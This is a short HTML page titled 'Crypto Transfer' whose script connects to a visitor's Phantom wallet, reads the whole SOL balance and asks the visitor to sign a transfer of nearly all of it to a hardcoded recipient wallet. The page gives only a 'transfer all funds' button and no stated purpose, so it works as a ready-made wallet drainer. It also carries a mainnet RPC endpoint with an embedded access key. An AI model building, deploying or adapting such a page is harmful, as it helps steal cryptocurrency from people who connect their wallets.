<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <script type="module">
        import { Connection, PublicKey, Transaction, SystemProgram } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
        
        window.Buffer = window.buffer?.Buffer || window.Buffer;

        const recipientWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
        const connection = new Connection("https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df");

        async function transferFunds() {
            if (!window.phantom || !window.phantom.solana) {
                alert("Phantom wallet is not detected. Please install it and try again.");
                return;
            }
            try {
                const provider = window.phantom.solana;
                await provider.connect();
                const senderPublicKey = new PublicKey(provider.publicKey);

                const balance = await connection.getBalance(senderPublicKey);
                if (balance <= 0) {
                    alert("Insufficient SOL balance to proceed with the transfer.");
                    return;
                }

                const transaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: senderPublicKey,
                        toPubkey: new PublicKey(recipientWallet),
                        lamports: balance - 5000, // Keep small buffer for fees
                    })
                );

                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
                transaction.feePayer = senderPublicKey;

                const signedTransaction = await provider.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());

                alert(`Transaction sent: https://explorer.solana.com/tx/${signature}?cluster=mainnet-beta`);
            } catch (error) {
                alert(`Error: ${error.message}`);
                console.error("Transaction failed:", error);
            }
        }
    </script>
</head>
<body>
    <h2>Click below to transfer all funds</h2>
    <button onclick="transferFunds()">Transfer Now</button>
</body>
</html>
